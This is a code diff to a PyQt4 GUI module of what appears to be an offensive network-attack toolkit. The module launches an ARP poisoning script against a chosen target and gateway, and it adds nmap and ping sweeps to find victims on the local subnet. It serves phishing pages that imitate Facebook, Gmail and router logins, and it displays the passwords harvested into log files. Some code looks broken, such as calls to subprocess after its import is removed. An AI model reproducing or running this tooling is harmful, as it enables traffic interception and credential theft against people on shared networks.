@@ -1,44 +1,109 @@
 from PyQt4.QtGui import *
 from PyQt4.QtCore import *
-from os import popen,devnull
-from Core.Settings_fuc import frm_Settings
-from Module.networksdisc import frm_GetIP
-from Module.AttackUp_arp import frm_update_attack
-from os import popen,chdir,getcwd,getuid
+from Core.Settings import frm_Settings
+from Modules.networksdisc import frm_GetIP
+from Modules.AttackUp_arp import frm_update_attack
+from os import popen,chdir,getcwd,getuid,devnull
 import fcntl, socket, struct
 from scapy.all import *
-import subprocess
 import threading
 from time import sleep
 from re import compile
 from urllib2 import urlopen,URLError
+from nmap import PortScanner
+from re import search
+global config_getway
+from multiprocessing import Process,Manager
+
+config_getway = None
 class frm_Arp(QMainWindow):
     def __init__(self, parent=None):
         super(frm_Arp, self).__init__(parent)
         self.form_widget = frm_Arp_Poison(self)
         self.setCentralWidget(self.form_widget)
 
+class ScanIPlocal(QThread):
+    def __init__(self,parent=None):
+        QThread.__init__(self,parent)
+        self.result = ''
+    def run(self):
+        nm = PortScanner()
+        a=nm.scan(hosts=config_getway, arguments='-sU --script nbstat.nse -O -p137')
+        for k,v in a['scan'].iteritems():
+            if str(v['status']['state']) == 'up':
+                try:
+                    ip = str(v['addresses']['ipv4'])
+                    hostname =  str(v['hostscript'][0]["output"]).split(",")[0]
+                    hostname = hostname.split(":")[1]
+                    mac =  str(v['hostscript'][0]["output"]).split(",")[2]
+                    if search("<unknown>",mac):
+                        mac = "<unknown>"
+                    else:
+                        mac = mac[13:32]
+                    self.result = ip +"|"+mac.replace("\n","")+"|"+hostname.replace("\n","")
+                    self.emit(SIGNAL("Activated( QString )"),self.result)
+                except :
+                    pass
+
+
 class frm_Arp_Poison(QWidget):
     def __init__(self, parent=None):
         super(frm_Arp_Poison, self).__init__(parent)
         self.setWindowTitle("Arp Posion Attack ")
         self.setWindowIcon(QIcon('rsc/icon.ico'))
-        sshFile="Core/dark_style.css"
-        with open(sshFile,"r") as fh:
-            self.setStyleSheet(fh.read())
         self.Main = QVBoxLayout()
         self.owd = getcwd()
         self.control = False
         self.local = self.get_geteway()
         self.configure = frm_Settings()
+        self.loadtheme(self.configure.XmlThemeSelected())
         self.module_network = frm_GetIP()
+        self.data = {'IPaddress':[], 'Hostname':[], 'MacAddress':[]}
         self.GUI()
+
+    def loadtheme(self,theme):
+        if theme != "theme2":
+            sshFile=("Core/%s.css"%(theme))
+            with open(sshFile,"r") as fh:
+                self.setStyleSheet(fh.read())
+        else:
+            sshFile=("Core/%s.css"%(theme))
+            with open(sshFile,"r") as fh:
+                self.setStyleSheet(fh.read())
 
     def GUI(self):
         self.form =QFormLayout()
-        self.list_ip = QListWidget(self)
-        self.list_ip.setFixedHeight(250)
-        self.list_ip.clicked.connect(self.list_clicked_scan)
+
+        self.movie = QMovie("rsc/loading2.gif", QByteArray(), self)
+        size = self.movie.scaledSize()
+        self.setGeometry(200, 200, size.width(), size.height())
+        self.movie_screen = QLabel()
+        self.movie_screen.setFixedHeight(200)
+        self.movie_screen.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
+        self.movie_screen.setAlignment(Qt.AlignCenter)
+        self.movie.setCacheMode(QMovie.CacheAll)
+        self.movie.setSpeed(100)
+        self.movie_screen.setMovie(self.movie)
+        self.movie_screen.setDisabled(False)
+
+        self.movie.start()
+        self.tables = QTableWidget(5,3)
+        self.tables.setRowCount(100)
+        self.tables.setFixedHeight(200)
+        self.tables.setSelectionBehavior(QAbstractItemView.SelectRows)
+        self.tables.setEditTriggers(QAbstractItemView.NoEditTriggers)
+        self.tables.clicked.connect(self.list_clicked_scan)
+        self.tables.resizeColumnsToContents()
+        self.tables.resizeRowsToContents()
+        self.tables.horizontalHeader().resizeSection(1,120)
+        self.tables.horizontalHeader().resizeSection(0,145)
+        self.tables.horizontalHeader().resizeSection(2,158)
+        self.tables.verticalHeader().setVisible(False)
+        Headers = []
+        for key in reversed(self.data.keys()):
+            Headers.append(key)
+        self.tables.setHorizontalHeaderLabels(Headers)
+
         self.txt_target = QLineEdit(self)
         self.txt_gateway = QLineEdit(self)
         self.txt_redirect = QLineEdit(self)
@@ -121,7 +186,10 @@ class frm_Arp_Poison(QWidget):
             self.configure.xmlSettings("local1","gateway","None",False)
             self.configure.xmlSettings("local0","ipaddress","None",False)
 
-        self.form.addRow(self.list_ip)
+        self.form0  = QGridLayout()
+        self.form0.addWidget(self.movie_screen,0,0)
+        self.form0.addWidget(self.tables,0,0)
+        self.form.addRow(self.form0)
         self.form.addRow(self.grid1)
         self.form.addRow("Target:", self.txt_target)
         self.form.addRow("GateWay:", self.txt_gateway)
@@ -131,6 +199,26 @@ class frm_Arp_Poison(QWidget):
         self.form.addRow(self.grid0)
         self.Main.addLayout(self.form)
         self.setLayout(self.Main)
+
+    def thread_scan_reveice(self,info_ip):
+        self.scanner_OFF(False,"txt_status")
+        self.movie_screen.setDisabled(False)
+        self.tables.setVisible(True)
+        data = info_ip.split("|")
+        Headers = []
+        self.data['IPaddress'].append(data[0])
+        self.data['MacAddress'].append(data[1])
+        self.data['Hostname'].append(data[2])
+        for n, key in enumerate(reversed(self.data.keys())):
+            Headers.append(key)
+            for m, item in enumerate(self.data[key]):
+                item = QTableWidgetItem(item)
+                item.setTextAlignment(Qt.AlignVCenter | Qt.AlignCenter)
+                self.tables.setItem(m, n, item)
+        Headers = []
+        for key in reversed(self.data.keys()):
+            Headers.append(key)
+        self.tables.setHorizontalHeaderLabels(Headers)
 
     def show_frm_options(self):
         option = True
@@ -159,6 +247,7 @@ class frm_Arp_Poison(QWidget):
         self.j.setWindowTitle("Templates Phishing Attack")
         self.j.txt_redirect.setText(self.txt_redirect.text())
         self.j.show()
+
     def kill_attack(self):
         popen("killall xterm")
         self.arp_status(False)
@@ -208,26 +297,89 @@ class frm_Arp_Poison(QWidget):
             if len(self.txt_redirect.text()) != 0:
                 self.arp_status(True)
                 self.conf_attack(True)
-                n = (popen("""xterm -geometry 75x15-1+200 -T "ARP POSION Attack On %s" -e sudo python Module/arp_Attacker.py %s %s %s """%(target,
+                n = (popen("""xterm -geometry 75x15-1+200 -T "ARP POSION Attack On %s" -e sudo python Modules/arp_Attacker.py %s %s %s """%(target,
                 target,gateway,mac)).read()) + "exit"
-                while n != "dsa":
+                while n != None:
                     if n == "exit":
                         self.arp_status(False)
                         self.conf_attack(False)
                         break
         else:
             self.arp_status(False)
-            
     def check_geteway_scan(self):
-        if self.txt_gateway != "":
-            self.t = threading.Thread(target=self.scanner_network,args=(str(self.txt_gateway.text()),))
-            self.t.daemon = True
-            self.t.start()
+        threadscan_check = self.configure.xmlSettings("advanced","Function_scan",None,False)
+        self.tables.clear()
+        self.data = {'IPaddress':[], 'Hostname':[], 'MacAddress':[]}
+        if threadscan_check == "Nmap":
+            if  self.txt_gateway != "":
+                self.movie_screen.setDisabled(True)
+                self.tables.setVisible(False)
+                global config_getway
+                config_getway = str(self.txt_gateway.text())
+                get_ip = len(config_getway)-1
+                config_getway = config_getway[:get_ip] + "0/24"
+                self.ThreadScanner = ScanIPlocal(self)
+                self.connect(self.ThreadScanner,SIGNAL("Activated ( QString ) "), self.thread_scan_reveice)
+                self.scanner_OFF(True,"txt_status")
+                self.ThreadScanner.start()
+        elif threadscan_check == "Ping":
+            if self.txt_gateway != "":
+                config = str(self.txt_gateway.text())
+                self.scanner_OFF(True,"txt_status")
+                self.scanner_network(config)
         else:
-            QMessageBox.information(self,"Error", "Gateway Not found check the internet connection")
+            QMessageBox.information(self,"Error on select thread Scan","thread scan not selected.")
 
+    def working(self,ip,lista):
+        with open(devnull, "wb") as limbo:
+            result=subprocess.Popen(["ping", "-c", "1", "-n", "-W", "1", ip],
+                                        stdout=limbo, stderr=limbo).wait()
+            if not result:
+                print("online",ip)
+                lista[ip] = ip + "|" + self.module_network.get_mac(ip)
+            else:
+                print ip,"offline"
+
+    def scanner_network(self,gateway):
+        get_ip = len(gateway)-1
+        gateway = gateway[:get_ip]
+        ranger = str(self.ip_range.text()).split("-")
+        self.control = True
+        jobs = []
+        manager = Manager()
+        on_ips = manager.dict()
+        for n in xrange(int(ranger[0]),int(ranger[1])):
+            ip="%s{0}".format(n)%(gateway)
+            p = Process(target=self.working,args=(ip,on_ips))
+            jobs.append(p)
+            p.start()
+        for i in jobs: i.join()
+        for i in on_ips.values():
+            Headers = []
+            n = i.split("|")
+            self.data['IPaddress'].append(n[0])
+            self.data['MacAddress'].append(n[1])
+            self.data['Hostname'].append("<unknown>")
+            for n, key in enumerate(reversed(self.data.keys())):
+                Headers.append(key)
+                for m, item in enumerate(self.data[key]):
+                    item = QTableWidgetItem(item)
+                    item.setTextAlignment(Qt.AlignVCenter | Qt.AlignCenter)
+                    self.tables.setItem(m, n, item)
+            self.scanner_OFF(False,"txt_status")
+        Headers = []
+        for key in reversed(self.data.keys()):
+            Headers.append(key)
+        self.tables.setHorizontalHeaderLabels(Headers)
     def Stop_scan(self):
         self.control = False
+        self.ThreadScanner.deleteLater()
+        self.scanner_OFF(False,"txt_status")
+        Headers = []
+        for key in reversed(self.data.keys()):
+            Headers.append(key)
+        self.tables.setHorizontalHeaderLabels(Headers)
+        self.tables.setVisible(True)
 
     def scanner_OFF(self,bool,wid):
         if bool and wid == "txt_status":
@@ -247,30 +399,7 @@ class frm_Arp_Poison(QWidget):
             self.txt_statusarp.setStyleSheet("QLabel {  color : red; }")
         popen("clear")
 
-    def scanner_network(self,gateway):
-        self.list_ip.clear()
-        self.control =False
-        get_ip = len(gateway)-1
-        gateway = gateway[:get_ip]
-        ranger = str(self.ip_range.text()).split("-")
-        with open(devnull, "wb") as limbo:
-            self.control = True
-            self.scanner_OFF(True,"txt_status")
-            for n in xrange(int(ranger[0]),int(ranger[1])):
-                ip="%s{0}".format(n)%(gateway)
-                result=subprocess.Popen(["ping", "-c", "1", "-n", "-W", "1", ip],
-                                        stdout=limbo, stderr=limbo).wait()
-                if not result:
-                    itm = QListWidgetItem(ip)
-                    itm.setIcon(QIcon(r"rsc/online.png"))
-                    self.list_ip.addItem(itm)
-                else:
-                    print ip, "Offline"
-                if not self.control:
-                    self.scanner_OFF(False,"txt_status")
-                    break
-            self.scanner_OFF(False,"txt_status")
-            self.control =False
+
 
     def get_geteway(self):
         output = popen("route | grep default").read().split()
@@ -285,10 +414,11 @@ class frm_Arp_Poison(QWidget):
 
     @pyqtSlot(QModelIndex)
     def list_clicked_scan(self, index):
-        itms = self.list_ip.selectedIndexes()
-        for i in itms:
-            self.txt_target.setText(i.data().toString())
-            self.control = False
+        item = self.tables.selectedItems()
+        if item != []:
+            self.txt_target.setText(item[0].text())
+        else:
+            self.txt_target.clear()
 
 class frm_template(QDialog):
     def __init__(self, parent = None):
@@ -299,10 +429,20 @@ class frm_template(QDialog):
         self.center()
         self.control = None
         self.owd = getcwd()
-        sshFile="Core/dark_style.css"
-        with open(sshFile,"r") as fh:
-            self.setStyleSheet(fh.read())
+        self.config = frm_Settings()
+        self.loadtheme(self.config.XmlThemeSelected())
         self.gui_temp()
+
+    def loadtheme(self,theme):
+        if theme != "theme2":
+            sshFile=("Core/%s.css"%(theme))
+            with open(sshFile,"r") as fh:
+                self.setStyleSheet(fh.read())
+        else:
+            sshFile=("Core/%s.css"%(theme))
+            with open(sshFile,"r") as fh:
+                self.setStyleSheet(fh.read())
+
     def center(self):
         frameGm = self.frameGeometry()
         centerPoint = QDesktopWidget().availableGeometry().center()
@@ -363,7 +503,7 @@ class frm_template(QDialog):
     def phishing_page(self,sock):
             type_phishing = None
             if sock != None and sock != 1:
-                path = "Module/Phishing/Facebook/"
+                path = "Modules/Phishing/Facebook/"
                 try:
                     chdir(path)
                 except OSError,e:
@@ -375,11 +515,11 @@ class frm_template(QDialog):
                 face_page.close()
                 type_phishing = "Facebook"
             elif sock == 1 and sock != None:
-                path = "Module/Phishing/Route/"
+                path = "Modules/Phishing/Route/"
                 chdir(path)
                 type_phishing = "Route"
             else:
-                path = "Module/Phishing/Gmail/"
+                path = "Modules/Phishing/Gmail/"
                 try:
                     chdir(path)
                     request = urlopen('http://accounts.google.com/Login?hl').read()
@@ -438,7 +578,7 @@ class frm_get_credentials(QDialog):
             self.list_password.clear()
             logins = []
             chdir(self.owd)
-            log = open("Module/Phishing/Facebook/log.txt", "r")
+            log = open("Modules/Phishing/Facebook/log.txt", "r")
             for i,j in enumerate(log.readlines()):
                 logins.append(i)
                 s = j.split("-")
@@ -447,7 +587,7 @@ class frm_get_credentials(QDialog):
             self.list_password.clear()
             logins = []
             chdir(self.owd)
-            log = open("Module/Phishing/Gmail/log.txt", "r")
+            log = open("Modules/Phishing/Gmail/log.txt", "r")
             for i,j in enumerate(log.readlines()):
                 logins.append(i)
                 s = j.split("-")
@@ -456,7 +596,7 @@ class frm_get_credentials(QDialog):
             self.list_password.clear()
             logins = []
             chdir(self.owd)
-            log = open("Module/Phishing/Route/log.txt", "r")
+            log = open("Modules/Phishing/Route/log.txt", "r")
             for i,j in enumerate(log.readlines()):
                 logins.append(i)
                 s = j.split("-")
